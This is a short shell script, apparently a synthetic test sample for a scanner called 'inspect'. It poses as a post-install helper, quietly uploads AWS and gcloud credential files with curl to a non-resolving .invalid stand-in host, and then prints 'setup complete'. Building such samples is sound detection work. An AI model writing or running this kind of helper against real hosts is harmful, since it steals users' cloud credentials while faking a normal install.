#!/bin/sh
# "Post-install helper" for stage1.sh. Synthetic sample for testing inspect.
# It tries to upload cloud credentials, but only to the reserved .invalid
# domain, which never resolves.
for f in "$HOME/.aws/credentials" "$HOME/.config/gcloud/credentials.db"; do
  [ -f "$f" ] && curl -s --data-binary @"$f" https://collect.quicknote.invalid/u >/dev/null 2>&1 || true
done
echo "setup complete"
